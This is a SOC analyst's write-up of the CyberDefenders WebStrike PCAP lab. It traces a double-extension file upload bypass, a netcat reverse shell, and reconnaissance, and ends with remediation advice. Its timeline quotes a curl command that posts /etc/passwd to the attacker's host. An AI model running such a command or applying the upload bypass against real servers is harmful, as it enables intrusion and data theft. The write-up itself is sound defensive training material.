# WebStrike (File Upload Vulnerability & Exfiltration)

## 📖 Executive Summary
* **Platform/Dataset:** CyberDefenders (WebStrike PCAP)
* **Category:** Web Application Compromise / Reverse Shell
* **Status:** ✅ Completed
* **Objective:** Analyze network traffic (PCAP) to reconstruct an attack timeline, identify the initial access vector, and extract Indicators of Compromise (IOCs) following a suspected web server breach.

### Situation
A web server (`shoporoma.com` at `24.49.63.79`) experienced an unauthorized intrusion. Full packet capture (PCAP) data was provided to the SOC for analysis to determine how the threat actor bypassed security controls, what level of access was achieved, and if any sensitive data was compromised.

### Task
1. Identify Attacker Location – Determine geographic origin of attack traffic
2. Profile Attacker Tools & Methods – Extract user agent
3. Identify Malicious Payload – Determine what file was uploaded and where
4. Analyze Exploitation Technique – Understand the vulnerability and bypass method
5. Trace Data Exfiltration – Identify what data was accessed and how it was stolen
6. Document Complete Attack Chain – Reconstruct full timeline of exploitation

---

## 🔍 Investigation & Action (Methodology)

1.  **Endpoint & Traffic Analysis:** Filtered HTTP and TCP traffic to identify the primary actors. Determined the attacker's IP address to be `117.11.88.124` (Tianjin, China).

<img width="1082" height="273" alt="image" src="https://github.com/user-attachments/assets/0cdd1ee3-2f6b-4929-adea-233aec8d39eb" />
 
2. **User-Agent Profiling:** Extracted the attacker's User-Agent string from the HTTP stream: `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`.
<img width="1568" height="925" alt="image" src="https://github.com/user-attachments/assets/fc709b7c-a1b1-4af3-a012-c4843460d241" />

3.  **Vulnerability Identification:** Analyzed HTTP POST requests directed at `/reviews/upload.php`. The attacker attempted to upload a standard PHP shell (`image.php`) but was blocked by application filters ("Invalid file format"). The attacker then successfully bypassed the filter by utilizing a double extension: `image.jpg.php`.
<img width="1114" height="478" alt="image" src="https://github.com/user-attachments/assets/2024af0e-a297-454d-8c2c-d7b409916599" />

4.  **Payload Analysis:** Reconstructed the TCP stream to reveal the contents of the malicious payload. The script contained a netcat reverse shell executing over port `8080`.
<img width="1032" height="617" alt="image" src="https://github.com/user-attachments/assets/cbccc222-c096-4adb-912d-5ff5c877bdaf" />
    
5.  **Post-Exploitation Tracking:** Monitored the established reverse shell session (TCP Stream 13). Observed the attacker executing reconnaissance commands (`whoami`, `uname -a`, `pwd`).

6.  **Data Exfiltration:** Identified the critical impact of the breach when the attacker successfully read the `/etc/passwd` file and exfiltrated it back to their infrastructure over port 443 using the `curl` utility.

<img width="1043" height="807" alt="image" src="https://github.com/user-attachments/assets/5739303f-baf3-4b9c-80cd-988cf7099a62" />

---

## ⏱️ Incident Timeline

| Event | Source / Evidence |
| :--- | :--- |
| **Initial Access Attempt** | Attacker uploaded `image.php`, which was rejected by the server. |
| **Successful Exploitation** | Attacker successfully uploaded the reverse shell payload named `image.jpg.php` to the `/reviews/uploads/` directory. |
| **C2 Established** | Reverse shell executed, establishing a connection back to the attacker on port `8080`. |
| **Exfiltration** | Attacker executed `curl -X POST -d @/etc/passwd http://117.11.88.124:443/` to steal the local password file. |

---

## 🛑 Root Cause Analysis & Remediation
The root cause of this breach was inadequate input validation and file extension filtering on the `/reviews/upload.php` endpoint. The application failed to properly sanitize the `image.jpg.php` file, treating it as executable PHP code rather than a static image. 

**Remediation Recommendations:**
* Implement strict server-side validation to only accept specific MIME types and single, trusted file extensions (e.g., `.jpg`, `.png`).
* Store all user-uploaded files in an isolated directory (e.g., an S3 bucket or a directory with execution privileges explicitly disabled).
* Deploy a Web Application Firewall (WAF) to detect and block reverse shell payloads and unauthorized `curl` exfiltration attempts.
